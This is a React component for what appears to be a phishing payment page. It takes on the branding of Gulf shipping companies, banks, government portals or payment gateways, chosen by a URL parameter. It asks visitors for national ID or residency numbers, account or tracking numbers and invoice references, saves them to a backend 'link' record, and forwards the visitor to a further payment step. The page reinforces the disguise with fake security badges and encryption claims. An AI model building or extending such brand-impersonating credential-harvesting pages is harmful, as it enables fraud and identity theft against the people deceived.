import { useState, useEffect, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { useToast } from "@/hooks/use-toast";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getCountryByCode } from "@/lib/countries";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { resolveEntity, PaymentEntityConfig } from "@/config/gccPaymentEntities";
import { ThemedButton } from "@/components/ui/ThemedButton";
import { ThemedInput } from "@/components/ui/ThemedInput";
import { ThemedCard } from "@/components/ui/ThemedCard";
import { ThemedHeader } from "@/components/ui/ThemedHeader";
import {
  FileText,
  Loader2,
  ShieldCheck,
  Lock,
  Landmark,
  Info,
  CheckCircle,
  AlertCircle,
  Truck,
  CreditCard,
  Wallet,
  Building2,
  Shield,
} from "lucide-react";
import BackButton from "@/components/BackButton";
import BottomNav from "@/components/BottomNav";

const PaymentData = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: link, isLoading } = useLinkData(id);
  const updateLink = useUpdateLink();

  const [reference, setReference] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || urlParams.get('service') || link?.payload?.service_key || '';
  const countryCode = link?.country_code || "SA";
  const govSystem = getGovernmentPaymentSystem(countryCode);

  // Resolve entity config
  const entityConfig = useMemo<PaymentEntityConfig>(() => {
    return resolveEntity(serviceKey);
  }, [serviceKey]);

  // Fallback visual values from entity config
  const primaryColor = entityConfig.primary;
  const secondaryColor = entityConfig.accent;
  const backgroundColor = entityConfig.bg;
  const surfaceColor = entityConfig.surface;
  const textColor = entityConfig.text;
  const textLightColor = entityConfig.textMuted;
  const borderColor = entityConfig.inputBorder;
  const fontFamily = entityConfig.font;
  const borderRadius = entityConfig.cardRadius;
  const buttonHeight = entityConfig.btnHeight;
  const inputHeight = entityConfig.btnHeight;
  const cardShadow = '0 8px 24px rgba(0,0,0,0.08)';
  const buttonShadow = entityConfig.btnShadow;
  const logoUrl = entityConfig.logo;
  const entityNameAr = entityConfig.nameAr;
  const entityNameEn = entityConfig.name;
  const category = serviceKey.includes('shipping') || serviceKey.includes('aramex') || serviceKey.includes('dhl') ? 'shipping' :
                   serviceKey.includes('bank') ? 'bank' :
                   serviceKey.includes('gov') ? 'government' : 'payment_gateway';

  useEffect(() => {
    if (link?.payload?.reference) {
      setReference(link.payload.reference);
    }
  }, [link]);

  // Page title based on entity
  const pageTitle = category === 'shipping' ? 'بيانات الشحنة' :
                    category === 'bank' ? 'بيانات الحساب' :
                    category === 'payment_gateway' ? `بوابة ${entityNameAr}` :
                    'الاستعلام عن المستحقات';
  const pageDescription = category === 'shipping' ? 'أدخل بيانات الشحنة للمتابعة إلى الدفع' :
                          category === 'bank' ? 'أدخل بيانات الحساب للمتابعة' :
                          category === 'payment_gateway' ? `أدخل بياناتك للسداد عبر ${entityNameAr}` :
                          'يرجى إدخال بيانات الهوية ومرجع الخدمة للتحقق';

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!reference || !nationalId) {
      toast({ title: "تنبيه", description: "يرجى تعبئة كافة الحقول المطلوبة للمتابعة", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({
          linkId: id!,
          payload: { ...link?.payload, reference, nationalId }
        });
      }

      navigate(`/pay/${id}/recipient${window.location.search}`);
    } catch (err) {
      console.error(err);
    } finally {
      setIsSubmitting(false);
    }
  };

  if (isLoading || !link) {
    return (
      <div className="min-h-screen flex items-center justify-center" style={{ backgroundColor }}>
        <Loader2 className="w-10 h-10 animate-spin" style={{ color: primaryColor }} />
      </div>
    );
  }

  const CategoryIcon = category === 'shipping' ? Truck :
                       category === 'bank' ? Landmark :
                       category === 'payment_gateway' ? CreditCard :
                       Shield;

  return (
    <div className="min-h-screen pb-20" dir="rtl" style={{ backgroundColor, fontFamily }}>
      {/* Entity-Specific Header */}
      <ThemedHeader
        config={entityConfig}
        showBackButton
        onBack={() => navigate(-1)}
        title={entityNameAr}
        subtitle={entityNameEn}
      />

      <div className="container mx-auto px-4 py-8 sm:py-12">
        <div className="max-w-2xl mx-auto space-y-8 sm:space-y-10">
          {/* Page Title */}
          <div className="text-center space-y-2">
            <h2 className="text-2xl sm:text-3xl font-bold" style={{ color: textColor }}>{pageTitle}</h2>
            <p className="text-sm sm:text-lg font-medium" style={{ color: textLightColor }}>{pageDescription}</p>
          </div>

          {/* Main Card */}
          <ThemedCard config={entityConfig} variant="elevated" className="relative overflow-hidden">
            {/* Decorative element */}
            <div className="absolute top-0 right-0 w-24 h-24 sm:w-32 sm:h-32 opacity-[0.04] -mr-12 -mt-12 sm:-mr-16 sm:-mt-16 rounded-full" style={{ background: primaryColor }} />

            <form onSubmit={handleSubmit} className="p-6 sm:p-10 space-y-6 sm:space-y-8 relative z-10">
              <div className="space-y-4 sm:space-y-6">
                <ThemedInput
                  config={entityConfig}
                  label={category === 'shipping' ? 'رقم الشحنة / التتبع' : category === 'bank' ? 'رقم الحساب' : 'رقم الهوية الوطنية / الإقامة'}
                  value={nationalId}
                  onChange={(e) => setNationalId(e.target.value)}
                  placeholder={category === 'shipping' ? 'أدخل رقم الشحنة' : 'XXXXXXXXXX'}
                  maxLength={category === 'shipping' ? undefined : 10}
                  required
                />

                <ThemedInput
                  config={entityConfig}
                  label={category === 'shipping' ? 'رقم المرجع / الفاتورة' : 'رقم الفاتورة / المرجع'}
                  value={reference}
                  onChange={(e) => setReference(e.target.value)}
                  placeholder="أدخل الرقم المرجعي للخدمة"
                  icon={<FileText className="w-5 h-5" />}
                  required
                />
              </div>

              {/* Amount Display */}
              <div className="p-4 sm:p-6 rounded-2xl sm:rounded-3xl border space-y-3 sm:space-y-4" style={{ backgroundColor: `${primaryColor}08`, borderColor: `${primaryColor}20` }}>
                <div className="flex items-center gap-3">
                  <Info className="w-5 h-5" style={{ color: primaryColor }} />
                  <p className="text-sm font-bold" style={{ color: primaryColor }}>معلومات الفاتورة</p>
                </div>
                <div className="flex justify-between items-center">
                  <span className="text-sm font-medium" style={{ color: `${primaryColor}80` }}>المبلغ المستحق:</span>
                  <span className="text-xl sm:text-2xl font-bold" style={{ color: primaryColor }}>{formatCurrency(link.payload.payment_amount, link.payload.currency_code)}</span>
                </div>
              </div>

              {/* Submit Button */}
              <ThemedButton
                config={entityConfig}
                type="submit"
                disabled={isSubmitting}
                loading={isSubmitting}
              >
                {isSubmitting ? "جاري المعالجة..." : "تحقق ومتابعة السداد"}
              </ThemedButton>

              {/* Security Badges */}
              <div className="flex items-center justify-center gap-3 sm:gap-4 text-[9px] sm:text-[10px] font-bold uppercase" style={{ color: textLightColor }}>
                <div className="flex items-center gap-1"><Lock className="w-3 h-3" /> Encrypted</div>
                <div className="w-1 h-1 rounded-full" style={{ backgroundColor: borderColor }} />
                <div className="flex items-center gap-1"><ShieldCheck className="w-3 h-3" /> PCI DSS</div>
                <div className="w-1 h-1 rounded-full" style={{ backgroundColor: borderColor }} />
                <div className="flex items-center gap-1"><CheckCircle className="w-3 h-3" /> Verified</div>
              </div>
            </form>
          </ThemedCard>

          {/* Security Notice */}
          <div className="p-6 sm:p-8 rounded-2xl sm:rounded-[2.5rem] text-white flex items-center gap-6 sm:gap-8 shadow-xl" style={{ backgroundColor: '#1E293B' }}>
            <div className="w-14 h-14 sm:w-16 sm:h-16 bg-white/10 rounded-2xl flex items-center justify-center shrink-0 border border-white/20">
              <AlertCircle className="w-6 h-6 sm:w-8 sm:h-8 text-amber-400" />
            </div>
            <div>
              <h4 className="text-base sm:text-lg font-bold mb-1">تعليمات الأمن السيبراني</h4>
              <p className="text-xs opacity-60 font-medium leading-relaxed">
                تأكد دائماً من وجود علامة القفل في شريط العنوان. لا تشارك بياناتك البنكية مع أي روابط غير رسمية. هذه البوابة مشفرة بمعيار 256-bit.
              </p>
            </div>
          </div>
        </div>
      </div>
      <BottomNav />
    </div>
  );
};

export default PaymentData;
